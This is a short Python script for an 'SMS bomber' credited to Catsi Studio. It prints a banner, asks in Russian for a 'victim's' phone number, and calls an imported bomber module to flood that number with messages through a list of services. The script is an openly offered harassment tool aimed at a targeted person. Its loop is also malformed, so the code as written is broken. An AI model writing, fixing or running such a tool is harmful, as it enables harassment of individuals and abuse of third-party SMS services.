from sms_bomb import bomber
import time


banner = """


░██████╗███╗░░░███╗░██████╗  ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔════╝████╗░████║██╔════╝  ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
╚█████╗░██╔████╔██║╚█████╗░  ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
░╚═══██╗██║╚██╔╝██║░╚═══██╗  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
██████╔╝██║░╚═╝░██║██████╔╝  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚═════╝░╚═╝░░░░░╚═╝╚═════╝░  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
 sms-bomber by Catsi Studio
"""
print(banner)

ph = input("введите номер телефона жертвы.\\")
time.sleep(3) 
print("убедитесь что номер телефона коректный")
while True:

      services = bomber.loadservices("services.txt")
bomber.run(services, ph)

